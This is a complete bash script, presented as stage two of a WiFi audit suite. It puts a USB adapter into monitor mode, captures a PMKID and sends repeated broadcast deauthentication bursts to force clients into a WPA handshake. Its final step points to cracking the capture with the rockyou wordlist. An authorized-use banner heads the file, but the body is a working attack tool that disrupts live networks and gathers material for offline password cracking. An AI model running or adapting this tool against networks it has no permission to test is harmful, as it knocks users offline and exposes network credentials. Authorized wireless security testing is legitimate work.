#!/usr/bin/env bash
#
# capture.sh — Stage 2 of the WiFi audit suite (Kali/Linux, injection adapter).
#
# Reads a capture_manifest.json produced by Stage 1 (wifi_recon.py on Windows),
# puts a monitor/injection-capable USB adapter into monitor mode, locks onto the
# target BSSID + channel, and captures a WPA handshake and/or PMKID. Deauth is
# used only to nudge a connected client into re-handshaking.
#
# REQUIRES a USB adapter with an injection-capable chipset (e.g. RTL8812AU /
# Atheros). The laptop's built-in Intel AX211 CANNOT do this — not even passed
# through to this VM. See README.md.
#
# ===========================================================================
#  AUTHORIZED USE ONLY. Only run against networks you have written permission
#  to test. Deauthentication is an active attack against a live network.
# ===========================================================================
#
# Usage:
#   sudo ./capture.sh -i wlan1 -m capture_manifest.json [options]
#
# Options:
#   -i IFACE      wireless interface of the USB adapter (e.g. wlan1)   [required]
#   -m MANIFEST   path to capture_manifest.json from Stage 1           [required]
#   -o OUTDIR     output directory (default: ./captures)
#   -M MODE       handshake | pmkid | both   (default: both)
#   -t SECONDS    max capture time before giving up (default: 300)
#   -d COUNT      deauth bursts to send per round (default: 5; 0 = passive)
#   -h            help
#
set -uo pipefail

# ---- defaults --------------------------------------------------------------
IFACE=""
MANIFEST=""
OUTDIR="./captures"
MODE="both"
TIMEOUT=300
DEAUTH=5
MON_IFACE=""
AIRODUMP_PID=""
HCX_PID=""

log()  { echo -e "[\e[36m*\e[0m] $*"; }
ok()   { echo -e "[\e[32m+\e[0m] $*"; }
warn() { echo -e "[\e[33m!\e[0m] $*"; }
err()  { echo -e "[\e[31mx\e[0m] $*" >&2; }

usage() { grep '^#' "$0" | sed 's/^#//' | head -40; exit "${1:-0}"; }

# ---- parse args ------------------------------------------------------------
while getopts "i:m:o:M:t:d:h" opt; do
  case "$opt" in
    i) IFACE="$OPTARG" ;;
    m) MANIFEST="$OPTARG" ;;
    o) OUTDIR="$OPTARG" ;;
    M) MODE="$OPTARG" ;;
    t) TIMEOUT="$OPTARG" ;;
    d) DEAUTH="$OPTARG" ;;
    h) usage 0 ;;
    *) usage 1 ;;
  esac
done

[[ $EUID -eq 0 ]]        || { err "Run as root (sudo)."; exit 1; }
[[ -n "$IFACE" ]]        || { err "Missing -i IFACE."; usage 1; }
[[ -n "$MANIFEST" ]]     || { err "Missing -m MANIFEST."; usage 1; }
[[ -f "$MANIFEST" ]]     || { err "Manifest not found: $MANIFEST"; exit 1; }

# ---- dependency check ------------------------------------------------------
need() { command -v "$1" >/dev/null 2>&1 || { err "Missing dependency: $1"; MISSING=1; }; }
MISSING=0
need airmon-ng; need airodump-ng; need aireplay-ng; need aircrack-ng; need jq
[[ "$MODE" == "handshake" ]] || need hcxdumptool
[[ $MISSING -eq 0 ]] || { err "Install: sudo apt install aircrack-ng hcxdumptool jq"; exit 1; }

# ---- read manifest ---------------------------------------------------------
SSID=$(jq -r '.target_ssid // empty' "$MANIFEST")
BSSID=$(jq -r '.bssid // empty' "$MANIFEST")
CHANNEL=$(jq -r '.channel // empty' "$MANIFEST")
CRACKABLE=$(jq -r '.wpa2_psk_crackable // false' "$MANIFEST")

[[ -n "$BSSID" && -n "$CHANNEL" ]] || { err "Manifest missing bssid/channel."; exit 1; }

log "Target SSID : ${SSID:-<hidden>}"
log "Target BSSID: $BSSID"
log "Channel     : $CHANNEL"
log "Mode        : $MODE   Deauth/round: $DEAUTH   Timeout: ${TIMEOUT}s"
if [[ "$CRACKABLE" != "true" ]]; then
  warn "Manifest says target is NOT WPA2-PSK — a captured handshake may not be"
  warn "offline-crackable (e.g. WPA3-SAE / Enterprise). Continuing anyway."
fi

mkdir -p "$OUTDIR"
STAMP=$(date +%Y%m%d-%H%M%S)
SAFE_SSID=$(echo "${SSID:-target}" | tr -c 'A-Za-z0-9_.-' '_')
BASE="$OUTDIR/${SAFE_SSID}_${STAMP}"

# ---- cleanup handler -------------------------------------------------------
cleanup() {
  log "Cleaning up..."
  [[ -n "$AIRODUMP_PID" ]] && kill "$AIRODUMP_PID" 2>/dev/null
  [[ -n "$HCX_PID" ]]      && kill "$HCX_PID" 2>/dev/null
  if [[ -n "$MON_IFACE" ]]; then
    airmon-ng stop "$MON_IFACE" >/dev/null 2>&1
    systemctl start NetworkManager 2>/dev/null
    ok "Restored managed mode / NetworkManager."
  fi
}
trap cleanup EXIT INT TERM

# ---- monitor mode ----------------------------------------------------------
log "Enabling monitor mode on $IFACE ..."
airmon-ng check kill >/dev/null 2>&1
airmon-ng start "$IFACE" "$CHANNEL" >/dev/null 2>&1
# derive monitor iface name (airmon may rename to wlanXmon or keep the name)
if iw dev | grep -q "${IFACE}mon"; then MON_IFACE="${IFACE}mon"; else MON_IFACE="$IFACE"; fi
if ! iw dev "$MON_IFACE" info 2>/dev/null | grep -qi "type monitor"; then
  err "Could not confirm monitor mode on $MON_IFACE. Is this an injection-capable adapter?"
  exit 1
fi
iw dev "$MON_IFACE" set channel "$CHANNEL" 2>/dev/null
ok "Monitor mode active on $MON_IFACE (channel $CHANNEL)."

# quick injection sanity test (non-fatal)
if aireplay-ng --test "$MON_IFACE" 2>&1 | grep -qi "Injection is working"; then
  ok "Injection test passed."
else
  warn "Injection test did not confirm — deauth may not work. Passive capture still possible."
fi

# ---- PMKID capture (hcxdumptool) — often needs no client / no deauth --------
if [[ "$MODE" == "pmkid" || "$MODE" == "both" ]]; then
  log "Attempting PMKID capture via hcxdumptool (~30s)..."
  # newer hcxdumptool uses --enable_status; filter to our BSSID
  echo "$BSSID" | tr -d ':' | tr 'A-F' 'a-f' > "$BASE.filter" 2>/dev/null || true
  timeout 35 hcxdumptool -i "$MON_IFACE" -o "$BASE.pmkid.pcapng" \
      --enable_status=1 >/dev/null 2>&1 &
  HCX_PID=$!
  wait "$HCX_PID" 2>/dev/null
  HCX_PID=""
  if [[ -s "$BASE.pmkid.pcapng" ]]; then
    ok "PMKID capture file: $BASE.pmkid.pcapng (validate in Stage 3)."
  fi
fi

# ---- handshake capture (airodump + deauth loop) ----------------------------
if [[ "$MODE" == "handshake" || "$MODE" == "both" ]]; then
  log "Starting airodump-ng handshake capture..."
  airodump-ng --bssid "$BSSID" --channel "$CHANNEL" \
      -w "$BASE" --output-format pcap,csv "$MON_IFACE" >/dev/null 2>&1 &
  AIRODUMP_PID=$!
  sleep 5

  CAP="$BASE-01.cap"
  DEADLINE=$(( $(date +%s) + TIMEOUT ))
  GOT=0
  ROUND=0
  while [[ $(date +%s) -lt $DEADLINE ]]; do
    ROUND=$((ROUND+1))
    if [[ "$DEAUTH" -gt 0 ]]; then
      log "Round $ROUND: sending $DEAUTH deauth burst(s) to clients of $BSSID ..."
      # broadcast deauth (nudges any connected client to reauthenticate)
      aireplay-ng --deauth "$DEAUTH" -a "$BSSID" "$MON_IFACE" >/dev/null 2>&1
    fi
    sleep 8
    if [[ -f "$CAP" ]] && aircrack-ng "$CAP" 2>/dev/null | grep -qiE "1 handshake|WPA \(1 handshake"; then
      GOT=1
      break
    fi
    log "No handshake yet (round $ROUND). Retrying..."
  done

  if [[ $GOT -eq 1 ]]; then
    ok "HANDSHAKE CAPTURED: $CAP"
  else
    warn "No handshake within ${TIMEOUT}s. Common causes: no client connected,"
    warn "client on a different band, or injection unsupported. PMKID (if captured)"
    warn "may still be crackable — proceed to Stage 3."
  fi
fi

# ---- summary manifest for Stage 3 -----------------------------------------
RESULT="$OUTDIR/${SAFE_SSID}_${STAMP}.capture.json"
FILES=$(ls -1 "$BASE"*.cap "$BASE"*.pcapng 2>/dev/null | jq -R . | jq -s .)
jq -n --arg ssid "$SSID" --arg bssid "$BSSID" --arg ch "$CHANNEL" \
      --argjson files "${FILES:-[]}" \
  '{captured_at: now|todate, target_ssid:$ssid, bssid:$bssid, channel:$ch, files:$files}' \
  > "$RESULT"
ok "Stage-3 input manifest: $RESULT"
echo
ok "Next: sudo ./crack.sh -c \"$CAP\" -w /usr/share/wordlists/rockyou.txt"
